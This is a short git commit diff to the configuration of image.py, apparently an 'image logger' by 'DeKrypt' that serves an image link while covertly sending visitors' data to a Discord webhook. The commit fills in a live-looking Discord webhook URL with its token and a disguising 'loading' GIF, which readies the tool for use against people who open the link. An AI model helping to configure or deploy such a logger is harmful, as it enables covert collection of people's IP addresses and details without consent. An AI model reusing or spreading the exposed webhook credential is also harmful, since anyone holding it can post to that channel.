76e54223068b7c1b29cf80956421922567ef5343
launderings <audiomixing420@gmail.com>
2025-03-25 01:56:19 -0400

    Update image.py

--- image.py
+++ image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://canary.discord.com/api/webhooks/1353969638081298483/fXb1jfYhhCJss7fAeil-Xsl8qLQCQPWeA5KWmxJ8KclTTx2P7NH1ym3lMdcLUTHQ4Jip",
+    "image": "https://tenor.com/view/discord-loading-buffering-waiting-to-load-gif-16464415?quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
